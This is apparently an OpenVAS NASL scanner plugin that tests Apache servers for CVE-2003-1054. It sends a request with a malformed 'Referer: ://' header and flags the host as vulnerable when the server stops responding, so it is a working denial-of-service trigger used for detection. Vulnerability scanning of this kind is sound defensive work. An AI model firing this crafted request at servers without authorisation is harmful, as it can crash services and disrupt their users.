CPE = "cpe:/a:apache:http_server";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.11543" );
	script_version( "2021-05-17T11:26:07+0000" );
	script_tag( name: "last_modification", value: "2021-05-17 11:26:07 +0000 (Mon, 17 May 2021)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_cve_id( "CVE-2003-1054" );
	script_bugtraq_id( 7375 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:N/I:N/A:P" );
	script_name( "Apache HTTP Server 'mod_access_referer' 1.0.2 NULL Pointer Dereference Vulnerability" );
	script_category( ACT_DENIAL );
	script_copyright( "Copyright (C) 2003 Xue Yong Zhi" );
	script_family( "Denial of Service" );
	script_dependencies( "gb_apache_http_server_consolidation.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "apache/http_server/http/detected" );
	script_tag( name: "summary", value: "Apache HTTP Server running the 'mod_access_referer'
  module contains a NULL pointer dereference bug." );
	script_tag( name: "impact", value: "Abuse of this vulnerability can possibly be used
  in denial of service attackers against affected systems." );
	script_tag( name: "solution", value: "Try another access control module, mod_access_referer
  has not been updated for a long time." );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "Mitigation" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
func check( req, port ){
	soc = http_open_socket( port );
	if(!soc){
		return ( 0 );
	}
	vt_strings = get_vt_strings();
	referrer = "www." + vt_strings["lowercase"] + ".net";
	req = http_get( item: req, port: port );
	idx = stridx( req, NASLString( "\\r\\n\\r\\n" ) );
	req = insstr( req, NASLString( "\\r\\nReferer: ://", referrer, "\\r\\n\\r\\n" ), idx );
	send( socket: soc, data: req );
	r = http_recv( socket: soc );
	close( soc );
	if(ContainsString( r, "HTTP" )){
		return ( 0 );
	}
	security_message( port: port );
	exit( 0 );
}
if(!port = get_app_port( cpe: CPE, service: "www" )){
	exit( 0 );
}
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
req = http_get( item: "/", port: port );
idx = stridx( req, NASLString( "\\r\\n\\r\\n" ) );
req = insstr( req, NASLString( "\\r\\nReferer: http://", referrer, "\\r\\n\\r\\n" ), idx );
r = http_keepalive_send_recv( port: port, data: req );
if(!r || !ContainsString( r, "HTTP" )){
	exit( 0 );
}
for dir in nasl_make_list_unique( http_cgi_dirs( port: port ), "/" ) {
	if(dir && check( req: dir, port: port )){
		exit( 0 );
	}
}
exit( 99 );

